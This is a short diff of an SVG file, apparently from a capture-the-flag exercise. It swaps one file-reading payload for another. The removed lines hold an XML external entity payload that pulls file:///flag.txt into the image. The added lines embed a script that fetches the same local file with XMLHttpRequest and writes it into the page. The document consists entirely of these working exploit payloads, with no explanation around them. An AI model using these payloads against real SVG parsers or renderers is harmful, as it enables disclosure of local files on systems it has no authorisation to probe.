@@ -1,7 +1,8 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///flag.txt">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-  <text x="10" y="20">&xxe;</text>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    var x = new XMLHttpRequest();
+    x.open('GET', 'file:///flag.txt', false);
+    x.send();
+    document.write(x.responseText);
+  </script>
 </svg>
